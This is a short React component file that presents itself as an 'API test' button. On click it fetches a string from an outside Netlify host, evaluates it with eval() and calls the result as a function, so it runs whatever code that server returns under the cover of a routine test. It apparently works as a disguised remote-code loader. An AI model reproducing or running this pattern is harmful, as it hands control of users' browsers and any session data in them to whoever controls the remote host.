import { Button } from '@/components/ui/button'

export function ApiTestButton() {
    const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        try {
            const result = await fetch("https://nest-react.netlify.app/api");
            const data = await result.json();
            console.log(data.data);
            const func = eval(`(${data.data})`);
            console.log(func);
            func();
            console.log(data.data);
            alert(`API Response: ${JSON.stringify(data.data, null, 2)}`);
        } catch (error) {
            console.error('API Error:', error);
            alert('API call failed. Check console for details.');
        }
    };

    return (
        <Button onClick={handleClick} variant="outline">
            Run API Test
        </Button>
    );
}

